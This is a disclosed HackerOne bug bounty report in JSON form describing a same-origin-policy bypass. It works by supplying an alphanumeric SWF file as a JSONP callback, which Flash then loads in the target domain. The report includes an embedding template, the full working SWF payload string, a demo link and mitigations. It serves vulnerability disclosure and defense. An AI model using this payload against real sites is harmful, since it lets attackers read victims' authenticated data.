{
  "id": 10373,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDM3Mw==",
  "url": "https://hackerone.com/reports/10373",
  "title": "Bypassing Same Origin Policy With JSONP APIs and Flash",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-04-29T23:54:14.670Z",
  "submitted_at": "2014-04-29T23:54:14.670Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "molnarg",
    "url": "/molnarg",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T112759Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18b5854de55cad4ebabdd855a01a0b6a3b283de5666f1ec95ab25b066d5c9c4d",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T112759Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cee24c72b0f4049213817490534049dea7beff89e1bc9c8ea0d1af54ab98aa62"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2014-07-19T17:32:22.258Z",
  "bug_reporter_agreed_on_going_public_at": "2014-07-19T13:03:05.495Z",
  "team_member_agreed_on_going_public_at": "2014-07-19T17:32:21.959Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Overview\n========\n\nThis is a new type of web vulnerability that is made possible by two seemingly unrelated things:\n\n- the way JSONP APIs work\n- the way Flash handles malformed SWF files\n\nand has an effect and limitations similar to XSS flaws:\n\n- the user has to visit a website set up by the attacker in order to trigger the vulnerability\n- as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user's cookies sent along with the request) and read the responses\n\nDescription\n===========\n\n[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.\n\nFrom the point of view of this discussion, the important part is that **the first bytes of the response can be controlled by a GET parameter** (typically named callback).\n\nIf an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API's domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.\n\nExample:\n\n    <object type=\"application/x-shockwave-flash\"\n            data=\"http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__\">\n      <param name=\"AllowScriptAccess\" value=\"always\">\n    </object>\n\nThe response to the HTTP request:\n\n    __SWF_FILE__({\"actual\": \"API\", \"response\": 15})\n\nThere is two significant problems that have to be solved by an attacker:\n\n 1. the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.\n 2. callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range\n\nThe first problem is in fact solved by the way **Flash** handles invalid SWF files: it **ignores additional bytes at the end of an otherwise valid Flash file**.\n\nThe second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. **It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data.** (As proven by my [ascii-zip] project)\n\nAs a demonstration, I've created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it's security context (the target domain's security context):\n\n    CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH\n\nThe embedder site can specify the SWF to load through the \"name\" property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.\n\nRelated work\n============\n\nThis attack is inspired by Alok Menghrajani's [related work], where he showed that it is possible to assemble a Flash file in the [\\x01-\\0x7F] byte range to prove that certain JSONP endpoints are not secure.\n\nThe real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.\n\nMitigation\n==========\n\nLimiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.\n\nThe API maintainer can mitigate this type of attack by **putting an empty JavaScript callback in front of the callback name in the repsonse**. This makes it impossible to control the first bytes of the response.\n\nAn other protection would be **hosting JSONP APIs on a sandbox domain**. The latter solution is only effective if there's no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.\n\nA proper solution would be **changing the way Flash handles malformed SWF files so that it won't files with additional data at the end of the SWF file**.\n\nAlthough one of the mitigations is fixing Flash, I don't consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.\n\nAffected sites\n==============\n\nI've tested the 35 top websites on Wikipedia's (somewhat out of date) copy of the Alexa [toplist](http://en.wikipedia.org/wiki/List_of_most_popular_websites) (after unifying www.google.* domains into a single entry), and 16 (~45%) of them proved to be vulnerable.\n\nThe unaffected sites fall into the following categories:\n- Sites that simply don't have any JSONP API.\n- Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani's [related work]).\n- Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don't have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.\n- A single site limits the callback name length to 50 characters.\n\n[DEMO](https://gabor.molnar.es/bb/9bfb0835d1e72705bb374132c4d2cb3e9a4417e91b9be31a074fb7d644b34988/octameter.html)\n=======\n\nJSONP: http://json-p.org/\nascii-zip: https://github.com/molnarg/ascii-zip\ncross domain proxy: https://github.com/borisreitman/CrossXHR\nrelated work: http://quaxio.com/jsonp_handcrafted_flash_files/\ntoplist: http://en.wikipedia.org/wiki/List_of_most_popular_websites\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2014-08-18T13:03:05.798Z",
  "allow_singular_disclosure_after": -299456693.75133425,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "tarwadahorse",
    "shivammusic",
    "zeroknife",
    "find0xt",
    "flexorium"
  ],
  "structured_scope": {
    "databaseId": 84121,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
